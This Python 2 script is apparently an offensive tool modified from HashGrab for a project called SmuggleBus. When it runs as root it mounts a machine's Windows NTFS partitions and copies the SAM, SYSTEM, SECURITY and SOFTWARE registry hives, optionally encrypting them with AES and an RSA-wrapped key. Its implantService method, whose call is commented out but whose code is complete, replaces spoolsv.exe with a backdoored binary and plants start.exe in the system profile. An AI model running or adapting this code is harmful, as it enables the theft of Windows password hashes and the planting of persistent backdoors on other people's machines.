#!/usr/bin/env python

# Script based on HashGrab v2.0 by s3my0n, 
#	Modified by Mike Wrzesniak and Piotr Marszalik for use with SmuggleBus

import sys, os, random, shutil, re, subprocess
import fnmatch
from time import sleep
from base64 import b64encode

Encrypt = os.path.isfile("/home/tc/public_key.pem") #if file exists, encrypt

class HashGrab(object):
    def __init__(self, basedir, filesystems=['HPFS/NTFS', 'FAT16/FAT32', 'ntfs']):
        self.basedir = basedir
        self.filesystems = filesystems
        self.dirstocheck = ['/WINDOWS/System32/config/', '/Windows/System32/config/', '/WINNT/System32/config/', '/WINDOWS/system32/config/']
        self.files = ['SYSTEM', 'SAM', 'system','sam','SECURITY','security','SOFTWARE','software']
        self.ftocopy = []
        self.hashes = {}
        self.devs = []
        self.mountdirs = []
        self.samsystem_dirs = {}
        self.filestocopy = []
        # poc
        # self.filestocopy = [['/mnt/GNsm5H', 'GNsm5H', '/mnt/GNsm5H/Windows/System32/config/SYSTEM', '/mnt/GNsm5H/Windows/System32/config/SAM']]

        
    def findPartitions(self):
        decider = subprocess.Popen(('whoami'), stdout=subprocess.PIPE).stdout
        decider = decider.read().strip()
        if decider != 'root':
            print '\n [-] Error: you are not root'
            sys.exit(1)
        else:
            ofdisk = subprocess.Popen(('blkid'), stdout=subprocess.PIPE).stdout
            rfdisk = [i.strip() for i in ofdisk]
            ofdisk.close()
            for line in rfdisk:
                for f in self.filesystems:
                    if f in line:
                        dev = re.findall('/\w+/\w+\d+', line)
                        self.devs.append(dev[0])

    def mountPartitions(self):
        def randgen(integer):
            chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            x = random.sample(chars, integer)
            randstring = ''.join(x)
            return randstring
        print 'Mounting directories'						
        for dev in self.devs:
            mname = randgen(6)
            mdir = '/mnt/%s' % (mname)
            self.mountdirs.append([mdir, mname])
            os.mkdir(mdir)
            cmd = subprocess.call(('ntfs-3g', '-o remove_hiberfile', '%s'%(dev), '%s'%(mdir)))
            if cmd == 14:
                print '\n [-] Could not mount %s to %s: Trying ntfsfix and trying again' % (dev, mdir)
                cmd = subprocess.call(('ntfsfix','%s'%(dev)))
                cmd = subprocess.call(('ntfs-3g', '-o remove_hiberfile', '%s'%(dev), '%s'%(mdir)))
                if cmd == 14:
                    print '\n [-] Could not mount %s to %s: could not mount after ntfsfix. Trying other drives' % (dev, mdir)
            else:
                print '[*] Mounted %s to %s' % (dev, mdir)

    def findSamSystem(self):
        part_number = 0
        for m in self.mountdirs:
            self.filestocopy.append(m)
            for d in self.dirstocheck:
                for f in self.files:
                    cdir = '%s%s%s' % (m[0], d, f)
                    if os.path.isfile(cdir):
                        self.filestocopy[part_number].append(cdir)
            part_number+=1

    def copySamSystem(self):
        nmountdirs = len(self.mountdirs)
        decider = 0

        for f in self.filestocopy:
            # SAM and SYSTEM take up 3rd and 4th item in array
            if len(f) < 4:
                decider += 1
            else:
                self.ftocopy.append(f)
        if decider == nmountdirs:
            print '\n [-] Could not find SAM and SYSTEM files in %s' % (self.devs)
            self.cleanUp()
            sys.exit()
        else:
            print '[*] Copying SAM SYSTEM SECURITY and SOFTWARE files...'
            aes_key = b64encode(os.urandom(32)).decode('utf-8')
            for f in self.ftocopy:
                cpdir = '%s%s' % (self.basedir, f[1])
                self.samsystem_dirs[f[1]] = cpdir
                os.mkdir(cpdir)
                if Encrypt:
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[2], '-out', os.path.join(cpdir,'SYSTEM.enc'), '-k', aes_key])
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[3], '-out', os.path.join(cpdir,'SAM.enc'), '-k', aes_key])
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[4], '-out', os.path.join(cpdir,'SECURITY.enc'), '-k', aes_key])
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[5], '-out', os.path.join(cpdir,'SOFTWARE.enc'), '-k', aes_key])
                    echo_key = subprocess.Popen(('echo', aes_key), stdout=subprocess.PIPE)
                    output = subprocess.check_output(('openssl', 'rsautl', '-encrypt', '-inkey', 'public_key.pem', '-out', os.path.join(cpdir,'key.enc'), '-pubin'), stdin=echo_key.stdout)
                else:
                    shutil.copy(f[2], '%s/SYSTEM'%(cpdir))
                    shutil.copy(f[3], '%s/SAM'%(cpdir))
                    shutil.copy(f[4], '%s/SECURITY'%(cpdir))
                    shutil.copy(f[5], '%s/SOFTWARE'%(cpdir))

    def implantService(self):
        for f in self.filestocopy:
            #mountpointfoldername
            mt = f[1]
            spoolDir = '/mnt/%s/Windows/System32/' %(mt)    
            spoolBackdoor = '/home/tc/payload/spoolsv.exe'
            spoolOriginal = spoolDir + 'spoolsv.exe'
            spoolBackup = spoolDir + 'spoolsv.exe.bak'

            payload = '/home/tc/payload/start.exe'
            payloadDir = '/mnt/%s/Windows/System32/config/systemprofile/AppData/Roaming/' %(mt)
            payloadWin = payloadDir + 'start.exe' 

            osdirexist = os.path.isdir(payloadDir)
            if osdirexist:                        			
                print '[*] Implanting spoolsv.exe to %s' %(spoolOriginal)
                shutil.copy(spoolOriginal,spoolBackup)
                shutil.copy(spoolBackdoor,spoolOriginal)
                print '[*] Implanting start.exe to %s' %(payloadWin)
                shutil.copy(payload,payloadWin)
            else:            
                print '[ ] Payload directory does not exist on /mnt/%s'%(mt)

    def cleanUp(self, devs=True, mdirs=True, cpdirs=False):
        if devs:
            print '[*] Unmounting partitions...'
            sleep(1) # sometimes fails if you don't sleep
            for dev in self.devs:
                subprocess.call(('umount', '%s'%(dev)))
        if mdirs:
            print '[*] Deleting mount directories...'
            for d in self.mountdirs:
                os.rmdir(d[0])

if __name__=='__main__':

    basedir = './' #change hashes copy directory (include "/" at the end of path)

    decider = os.path.exists(basedir)
    if (decider == True) and (basedir[-1:] == '/'):
        hg = HashGrab(basedir)
        hg.findPartitions()
        hg.mountPartitions()
        hg.findSamSystem()
        hg.copySamSystem()
        #hg.implantService()
        hg.cleanUp()
    else:
        print '\n [-] Error: check your basedir'
        sys.exit(1)


